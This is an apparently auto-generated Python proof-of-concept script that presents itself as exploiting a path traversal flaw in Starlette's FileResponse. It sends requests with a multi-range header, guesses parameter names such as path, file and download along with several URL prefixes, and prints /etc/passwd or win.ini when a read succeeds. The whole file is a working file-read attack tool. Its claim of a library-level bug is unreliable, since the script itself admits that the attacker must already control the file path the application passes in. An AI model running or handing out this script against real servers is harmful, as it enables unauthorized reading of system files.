#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: lfi-011
# Sink: read
# Auto-generated — run with: python3 lfi_fileresponse_class_uses_self_read.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette FileResponse LFI (Path Traversal)
Vulnerability: FileResponse._handle_multiple_ranges opens self.path without sanitization.
If an attacker can control the path (e.g., via URL parameter or request scope), arbitrary files can be read.
This PoC demonstrates reading /etc/passwd (or a benign file on Windows) to confirm the vulnerability.
"""

import argparse
import sys
import os

try:
    import requests
except ImportError:
    print("[-] This PoC requires the 'requests' library. Install with: pip install requests")
    sys.exit(1)

# Default target (adjust as needed)
DEFAULT_TARGET = "http://localhost:8000"
# Benign file to read (safe for demonstration)
BENIGN_FILE = "/etc/passwd" if os.name != "nt" else "C:\\Windows\\win.ini"


def exploit_lfi(target_url: str, file_path: str, timeout: int = 10) -> None:
    """
    Attempt to read an arbitrary file via the Starlette FileResponse LFI.
    The vulnerability is triggered by sending a request with a 'Range' header
    that causes the server to call _handle_multiple_ranges, which opens the file
    at self.path without validation.

    Args:
        target_url: Base URL of the vulnerable Starlette application.
        file_path: Absolute path of the file to read (e.g., /etc/passwd).
        timeout: Request timeout in seconds.
    """
    # Construct the URL. The exact endpoint depends on the application.
    # We assume the vulnerable endpoint is at /files/<path> or similar.
    # If the application uses a query parameter like ?file=..., adjust accordingly.
    # For this PoC, we try a common pattern: /files?path=...
    # If that fails, we try /download?file=...
    # The attacker must know or guess the parameter name that controls self.path.
    # Common parameter names: path, file, filename, download, etc.
    # We'll try a few common ones.

    # First, try with a query parameter (most common in Starlette apps)
    params = [
        {"path": file_path},
        {"file": file_path},
        {"filename": file_path},
        {"download": file_path},
    ]

    # Also try path-based: /files/etc/passwd (if the app uses path parameters)
    path_based_urls = [
        f"{target_url.rstrip('/')}/files{file_path}",
        f"{target_url.rstrip('/')}/download{file_path}",
        f"{target_url.rstrip('/')}/static{file_path}",
    ]

    # Headers to trigger multipart range handling (the vulnerable code path)
    # The Range header with multiple ranges forces _handle_multiple_ranges to be called.
    headers = {
        "Range": "bytes=0-10, 20-30",
        "Accept": "*/*",
    }

    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {file_path}")
    print("[*] Trying query parameter methods...")

    for param_dict in params:
        try:
            # Build URL with query string
            query_string = "&".join(f"{k}={v}" for k, v in param_dict.items())
            url = f"{target_url.rstrip('/')}/?{query_string}"
            print(f"    -> GET {url}")
            resp = requests.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 206 and len(resp.content) > 0:
                print(f"[+] SUCCESS! Status: {resp.status_code}")
                print(f"[+] Response content (first 500 bytes):")
                print(resp.content[:500].decode("utf-8", errors="replace"))
                return
            elif resp.status_code == 200:
                # Maybe the server doesn't support ranges, but still returned the file
                print(f"[?] Got 200 OK, checking content...")
                if file_path in resp.text or "root:" in resp.text:
                    print(f"[+] File content detected in response!")
                    print(resp.text[:500])
                    return
            else:
                print(f"    Status: {resp.status_code}, length: {len(resp.content)}")
        except requests.exceptions.RequestException as e:
            print(f"    Error: {e}")

    print("[*] Trying path-based URLs...")
    for url in path_based_urls:
        try:
            print(f"    -> GET {url}")
            resp = requests.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 206 and len(resp.content) > 0:
                print(f"[+] SUCCESS! Status: {resp.status_code}")
                print(f"[+] Response content (first 500 bytes):")
                print(resp.content[:500].decode("utf-8", errors="replace"))
                return
            elif resp.status_code == 200:
                if file_path in resp.text or "root:" in resp.text:
                    print(f"[+] File content detected!")
                    print(resp.text[:500])
                    return
            else:
                print(f"    Status: {resp.status_code}, length: {len(resp.content)}")
        except requests.exceptions.RequestException as e:
            print(f"    Error: {e}")

    print("[-] Exploit failed. The vulnerable endpoint may use a different parameter name or path structure.")
    print("[-] Try adjusting the target URL or parameter names based on the actual application.")


def main():
    parser = argparse.ArgumentParser(
        description="Starlette FileResponse LFI PoC - Read arbitrary files via path traversal"
    )
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "-f", "--file",
        default=BENIGN_FILE,
        help=f"File to read (default: {BENIGN_FILE})"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    args = parser.parse_args()

    print("=" * 60)
    print("Starlette FileResponse LFI Proof-of-Concept")
    print("=" * 60)
    print()

    exploit_lfi(args.target, args.file, args.timeout)


if __name__ == "__main__":
    main()
